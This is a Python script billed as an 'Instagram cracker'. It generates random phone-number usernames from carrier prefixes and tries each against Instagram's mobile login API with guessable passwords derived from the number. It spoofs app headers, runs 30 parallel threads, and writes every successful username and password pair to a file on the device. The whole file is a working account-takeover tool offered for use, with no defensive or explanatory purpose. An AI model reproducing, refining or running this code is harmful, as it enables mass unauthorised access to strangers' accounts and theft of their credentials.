import random
import sys
import time
import hashlib
import uuid
import urllib.request
import requests
import string
from concurrent.futures import ThreadPoolExecutor
import os
import threading

# Global variables
loop = 0
oks = []
cps = []
idz = []

def crack(uid, pww, total_idz):
    global loop
    global oks
    global cps
    
    # Thread-safe increment counter
    with threading.Lock():
        loop += 1
    
    # Color codes for terminal output
    colors = ["\033[1;90m", "\033[1;91m", "\033[1;92m", "\x1b[38;5;208m", 
              "\033[1;93m", "\033[1;94m", "\033[1;95m", "\033[1;96m"]
    x = random.choice(colors)
    
    # Progress display
    sys.stdout.write(f"\r{x}[BITHIKA] {loop}/{total_idz} \033[1;92m{len(oks)}\033[1;97m/\033[1;91m{len(cps)} \033[1;97m[\033[1;93m{'{:.0%}'.format(loop/float(total_idz) if total_idz > 0 else 0)}\033[1;97m] ")
    sys.stdout.flush()
    
    try:
        for pw in pww:
            # Create session for each attempt
            byps = requests.Session()
            
            # Generate device hash
            hash_obj = hashlib.md5()
            hash_obj.update(uid.encode('utf-8') + pw.encode('utf-8'))
            hex_digest = hash_obj.hexdigest()
            
            # Second hash for device ID
            hash_obj.update(hex_digest.encode('utf-8') + '12345'.encode('utf-8'))
            
            headers = {
                'host': 'i.instagram.com',
                'x-ig-app-locale': 'in_ID',
                'x-ig-device-locale': 'in_ID',
                'x-ig-mapped-locale': 'id_ID',
                'x-pigeon-session-id': f'UFS-{str(uuid.uuid4())}-3',
                'x-pigeon-rawclienttime': '{:.3f}'.format(time.time()),
                'x-bloks-version-id': 'c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49',
                'x-ig-www-claim': '0',
                'x-bloks-is-prism-enabled': 'false',
                'x-bloks-is-layout-rtl': 'false',
                'x-ig-device-id': str(uuid.uuid4()),
                'x-ig-family-device-id': str(uuid.uuid4()),
                'x-ig-android-id': f'android-{hash_obj.hexdigest()[:16]}',
                'x-fb-connection-type': 'MOBILE.LTE',
                'x-ig-connection-type': 'MOBILE(LTE)',
                'x-ig-capabilities': '3brTv10=',
                'priority': 'u=3',
                'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 243.1.0.14.111 (iPhone13,3; iOS 15_5; en_US; en-US; scale=3.00; 1170x2532; 382468104) NW/3',
                'accept-language': 'id-ID, en-US',
                'x-mid': '',
                'ig-intended-user-id': '0',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'x-fb-http-engine': 'Liger',
                'x-fb-client-ip': 'True',
                'x-fb-server-cluster': 'True',
                'x-ig-bandwidth-speed-kbps': str(random.randint(100, 300)),
                'x-ig-bandwidth-totalbytes-b': str(random.randint(500000, 900000)),
                'x-ig-bandwidth-totaltime-ms': str(random.randint(1000, 9000)),
                'x-ig-app-id': '3419628305025917',
                'x-pigeon-rawclienttime': str(round(time.time(), 3)),
                'connection': 'keep-alive'
            }
            
            # Fix URL encoding issues
            encoded_data = (
                f'params=%7B%22client_input_params%22%3A%7B%22device_id%22%3A%22android-{hash_obj.hexdigest()[:16]}%22%2C%22login_attempt_count%22%3A1%2C%22secure_family_device_id%22%3A%22%22%2C%22machine_id%22%3A%22%22%2C%22accounts_list%22%3A%5B%5D%2C%22auth_secure_device_id%22%3A%22%22%2C%22password%22%3A%22%23PWD_INSTAGRAM%3A0%3A{str(int(time.time()))}%3A{urllib.request.quote(str(pw))}%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22fb_ig_device_id%22%3A%5B%5D%2C%22device_emails%22%3A%5B%5D%2C%22try_num%22%3A3%2C%22event_flow%22%3A%22login_manual%22%2C%22event_step%22%3A%22home_page%22%2C%22openid_tokens%22%3A%7B%7D%2C%22client_known_key_hash%22%3A%22%22%2C%22contact_point%22%3A%22{urllib.request.quote(str(uid))}%22%2C%22encrypted_msisdn%22%3A%22%22%7D%2C%22server_params%22%3A%7B%22username_text_input_id%22%3A%22p5hbnc%3A46%22%2C%22device_id%22%3A%22android-{hash_obj.hexdigest()[:16]}%22%2C%22should_trigger_override_login_success_action%22%3A0%2C%22server_login_source%22%3A%22login%22%2C%22waterfall_id%22%3A%22{str(uuid.uuid4())}%22%2C%22login_source%22%3A%22Login%22%2C%22INTERNAL__latency_qpl_instance_id%22%3A152086072800150%2C%22reg_flow_source%22%3A%22login_home_native_integration_point%22%2C%22is_platform_login%22%3A0%2C%22is_caa_perf_enabled%22%3A0%2C%22credential_type%22%3A%22password%22%2C%22family_device_id%22%3A%22{str(uuid.uuid4())}%22%2C%22INTERNAL__latency_qpl_marker_id%22%3A36707139%2C%22offline_experiment_group%22%3A%22caa_iteration_v3_perf_ig_4%22%2C%22INTERNAL_INFRA_THEME%22%3A%22harm_f%22%2C%22password_text_input_id%22%3A%22p5hbnc%3A47%22%2C%22ar_event_source%22%3A%22login_home_page%22%7D%7D&bk_client_context=%7B%22bloks_version%22%3A%225f56efad68e1edec7801f630b5c122704ec5378adbee6609a448f105f34a9c73%22%2C%22styles_id%22%3A%22instagram%22%7D&bloks_versioning_id=c55a52bd095e76d9a88e2142eaaaf567c093da6c0c7802e7a2f101603d8a7d49'
            )
            
            # Update headers with content length and cookies
            headers.update({
                'content-length': str(len(encoded_data)), 
                'cookie': (";").join([f"{key}={value}" for key, value in byps.cookies.get_dict().items()])
            })
            
            # Make the request
            response = byps.post(
                'https://i.instagram.com/api/v1/bloks/apps/com.bloks.www.bloks.caa.login.async.send_login_request/', 
                data=encoded_data, 
                headers=headers, 
                allow_redirects=True
            ).text
            
            # Check if login was successful
            if 'logged_in_user' in str(response):
                print(f"\r\033[1;92m [CONG-OK] {uid} | {pw}")
                try:
                    # Create directory if it doesn't exist
                    os.makedirs("/sdcard/XYZ", exist_ok=True)
                    with open("/sdcard/XYZ/RANDOM_OK.txt", "a") as f:
                        f.write(f"{uid}|{pw}\n")
                except (IOError, OSError):
                    # Fallback if SD card path doesn't work
                    os.makedirs("XYZ", exist_ok=True)
                    with open("XYZ/RANDOM_OK.txt", "a") as f:
                        f.write(f"{uid}|{pw}\n")
                
                # Thread-safe append to success list
                with threading.Lock():
                    oks.append(uid)
                return True
            else:
                continue
                
    except ConnectionError:
        print(f"\r\033[1;91m [Connection Error] Retrying in 10 seconds...")
        time.sleep(10)
        return False
    except requests.exceptions.RequestException as e:
        print(f"\r\033[1;91m [Request Error] {str(e)}")
        return False
    except KeyboardInterrupt:
        print(f"\r\033[1;93m [Interrupted] User stopped the process")
        return False
    except Exception as e:
        print(f"\r\033[1;91m [Unexpected Error] {str(e)}")
        return False



def clear():
    """Clear terminal screen"""
    os.system('cls' if os.name == 'nt' else 'clear')

def linex():
    """Print decorative line"""
    print(f"\033[1;97m{'='*50}")

###-------[DEF CLONING]-----------####
def random_number():
    clear()
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Codes : \033[1;92m0310, 0320, 0330, 0340 ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Limit : \033[1;92m1000, 2000, 5000, 10000 ")
    linex()
    code = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Code  :\033[1;92m ")
    try:
        limit = int(input(f" \033[1;97m[\033[1;92m?\033[1;97m] Enter Limit :\033[1;92m "))
    except ValueError:
        limit = 5000
    
    # Clear existing IDs and generate new ones
    idz.clear()
    for _ in range(limit):
        x = "".join(random.choice(string.digits) for _ in range(6))
        idz.append(x)
    
    with ThreadPoolExecutor(max_workers=30) as XYZ:
        clear()
        total_idz = str(len(idz))
        print(f"\033[1;96m KING IS ALWAYS KING")
        print(f"\033[1;96m SOME RESPECT")
        linex()
        print(f' \033[1;32m(√) \033[1;37mTotal IDs  :\033[1;32m ',total_idz)
        print(' \033[1;37m{\033[1;32m+\033[1;37m} \033[1;35mCHOICE SIM CODE : \033[1;32m'+code)
        print(" \x1b[38;5;208m(!) \x1b[38;5;205mUse Flight Mode For Speed UP")
        print(' \033[1;33m[•] \033[1;37mYour \033[1;32mOK\033[1;37m/\033[1;33mCP\033[1;37m IDs Save in \033[1;32m>\033[1;37m /sdcard/XYZ')
        linex()
        
        # Reset counters before starting
        global loop, oks, cps
        loop = 0
        oks = []
        cps = []
        
        for xyz in idz:
            uid = code+xyz
            pww = ['57273200', uid[:6], uid[:8], uid] 
            # Extended password patterns (commented in original)
            #,uid[:6],uid[:8],uid,uid[2:],uid[4:]
            XYZ.submit(crack, uid, pww, total_idz)
    
    linex()
    print(f" \033[1;97m[\033[1;92m!\033[1;97m] Process Completed ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97] Total Ok Accounts : \033[1;92m{str(len(oks))} ")
    print(f" \033[1;97m[\033[1;92m•\033[1;97m] Total Cp Accounts : \033[1;91m{str(len(cps))} ")
    linex()
    input(f" \033[1;97m[\033[1;91m!\033[1;97m] Press Enter To Back ")

def menu():
    """Main menu function"""
    while True:
        clear()
        print(f"\033[1;96m{'='*50}")
        print(f"\033[1;96m     INSTAGRAM CRACKER - FIXED VERSION")
        print(f"\033[1;96m{'='*50}")
        print(f" \033[1;97m[\033[1;92m1\033[1;97m] Random Number Cloning")
        print(f" \033[1;97m[\033[1;92m2\033[1;97m] Exit")
        print(f"\033[1;96m{'='*50}")
        
        choice = input(f" \033[1;97m[\033[1;92m?\033[1;97m] Select Option :\033[1;92m ")
        
        if choice == '1':
            random_number()
        elif choice == '2':
            print(f"\033[1;92m [GOODBYE] Thanks for using!")
            break
        else:
            print(f"\033[1;91m [INVALID] Please enter valid option!")
            time.sleep(2)

if __name__ == "__main__":
    menu()
